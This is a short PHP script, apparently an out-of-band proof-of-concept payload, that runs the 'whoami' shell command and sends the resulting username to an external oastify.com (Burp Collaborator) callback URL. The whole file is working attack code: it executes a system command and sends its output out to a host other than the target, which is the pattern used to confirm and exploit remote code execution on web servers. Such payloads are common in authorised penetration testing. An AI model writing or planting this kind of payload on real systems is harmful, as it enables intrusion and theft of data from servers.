<?php
// Get the current user
$user = shell_exec('whoami');
$user = trim($user);

// Send to collaborator.net
$url = "https://ztwd2ymn00posaq0v6vyp3xbp2vtju7j.oastify.com/?t=i&data=" . urlencode($user);
file_get_contents($url);

echo "Sent: " . $user . "\n";
?>